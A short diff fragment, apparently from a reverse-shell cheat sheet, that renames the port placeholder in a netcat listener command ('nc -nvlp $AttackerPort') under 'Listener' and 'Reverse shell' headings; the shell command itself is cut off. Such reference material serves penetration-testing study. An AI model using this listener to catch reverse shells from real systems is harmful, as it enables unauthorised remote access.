@@ -10,7 +10,7 @@
 
 Listener:
 ```
-nc -nvlp PortAtt
+nc -nvlp $AttackerPort
 ```
 Reverse shell:
 ```
